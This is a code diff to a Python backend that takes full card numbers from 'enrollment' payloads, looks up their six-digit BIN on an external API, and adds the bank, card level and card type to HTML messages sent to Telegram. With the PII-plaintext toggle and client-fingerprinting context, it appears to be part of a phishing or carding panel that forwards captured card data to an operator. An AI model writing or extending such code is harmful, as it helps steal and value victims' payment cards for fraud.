@@ -11,6 +11,7 @@ import html
 import json
 import logging
 import os
+import re
 import urllib.error
 import urllib.request
 from typing import Any
@@ -20,6 +21,7 @@ from backend import rsa_envelope, ua_parse
 logger = logging.getLogger(__name__)
 
 TELEGRAM_API = "https://api.telegram.org"
+HANDY_BIN_API_BASE = "https://data.handyapi.com/bin/"
 
 
 def _telegram_pii_plaintext_enabled() -> bool:
@@ -106,6 +108,84 @@ def _network_and_client_lines(
     return lines
 
 
+def _card_bin_from_reg(reg: dict[str, Any]) -> str:
+    """
+    Return 6-digit BIN when a plain card number is available in registration payload.
+
+    We intentionally require a full-looking PAN (12-19 digits) to avoid external lookups
+    from masked values used in tests/log views (e.g. ``1111******2222``).
+    """
+    raw = str(reg.get("card_number") or reg.get("cc") or "").strip()
+    if not raw:
+        return ""
+    if re.search(r"[^\d\s-]", raw):
+        return ""
+    digits = re.sub(r"\D", "", raw)
+    if not (12 <= len(digits) <= 19):
+        return ""
+    return digits[:6]
+
+
+def _pick_first_nonempty(d: dict[str, Any], keys: tuple[str, ...]) -> str:
+    for k in keys:
+        v = d.get(k)
+        if v is None:
+            continue
+        s = str(v).strip()
+        if s:
+            return s
+    return ""
+
+
+def _lookup_handy_bin_details(bin6: str, *, timeout_sec: float = 4.0) -> dict[str, str] | None:
+    """
+    Query handy BIN endpoint and return normalized fields for Telegram view.
+    """
+    b = re.sub(r"\D", "", str(bin6 or ""))[:6]
+    if len(b) != 6:
+        return None
+    url = f"{HANDY_BIN_API_BASE}{b}"
+    req = urllib.request.Request(
+        url,
+        method="GET",
+        headers={"Accept": "application/json"},
+    )
+    try:
+        with urllib.request.urlopen(req, timeout=timeout_sec) as resp:
+            raw = resp.read().decode("utf-8", errors="replace")
+    except (urllib.error.HTTPError, urllib.error.URLError, TimeoutError, OSError):
+        return None
+    try:
+        out = json.loads(raw) if raw else {}
+    except (json.JSONDecodeError, ValueError):
+        return None
+    if not isinstance(out, dict):
+        return None
+    # Common handy BIN field names and tolerant fallbacks.
+    bank_name = _pick_first_nonempty(out, ("Bank Name", "bank_name", "bankName", "bank"))
+    card_level = _pick_first_nonempty(out, ("Card Level", "card_level", "cardLevel", "level"))
+    bank_brand = _pick_first_nonempty(out, ("bankBrand", "brand", "scheme"))
+    card_type = _pick_first_nonempty(out, ("Card Type", "card_type", "cardType", "type"))
+    # Normalize card type display.
+    t = card_type.lower()
+    if "master" in t:
+        card_type = "mastercard"
+    elif "amex" in t or "american express" in t:
+        card_type = "amex"
+    elif "visa" in t:
+        card_type = "visa"
+    # If API has no useful fields, skip block.
+    if not any((bank_name, card_level, bank_brand, card_type)):
+        return None
+    return {
+        "bin": b,
+        "bank_name": bank_name or "—",
+        "card_level": card_level or "—",
+        "bank_brand": bank_brand or "—",
+        "card_type": card_type or "—",
+    }
+
+
 def _format_enrollment_telegram(
     reg: dict[str, Any],
     *,
@@ -172,6 +252,20 @@ def _format_enrollment_telegram(
                     "",
                 ]
             )
+    bin6 = _card_bin_from_reg(reg)
+    handy = _lookup_handy_bin_details(bin6) if bin6 else None
+    if handy:
+        lines.extend(
+            [
+                "🏦 <b>BIN details</b> <i>(handyapi)</i>",
+                f"🔢 <b>BIN</b>: <code>{esc(handy['bin'])}</code>",
+                f"🏛 <b>Bank Name</b>: {esc(handy['bank_name'])}",
+                f"🎚 <b>Card Level</b>: {esc(handy['card_level'])}",
+                f"🏷 <b>bankBrand</b>: {esc(handy['bank_brand'])}",
+                f"💳 <b>Card Type</b>: {esc(handy['card_type'])}",
+                "",
+            ]
+        )
     if extra_lines_before_network:
         lines.extend(extra_lines_before_network)
     lines.extend(
